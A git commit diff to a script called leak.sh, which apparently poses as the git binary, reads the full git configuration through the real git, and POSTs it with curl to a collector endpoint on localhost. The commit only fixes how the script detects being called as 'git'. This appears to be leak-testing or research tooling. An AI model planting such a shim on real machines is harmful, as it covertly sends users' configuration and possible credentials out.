0a2328dd010927999ac3aa4b36f3588a36141c9d
Kait <39479354+katrinafyi@users.noreply.github.com>
2025-04-15 09:04:30 +1000

    Update leak.sh

--- leak.sh
+++ leak.sh
@@ -7,7 +7,7 @@ leak() {
   exec curl --no-progress-meter -X POST 'http://127.0.0.1:8080/api/v1/account-joyride-hacksaw2-earmuff-upstairs-groggily' --data-binary "$1"
 }
 
-if [[ "$0" = git ]]; then
+if [[ "$(basename $0)" = git ]]; then
   realgit="$(dirname $0)/real/git"
   d="$("$realgit" config --list --show-origin)"
   leak "$d"
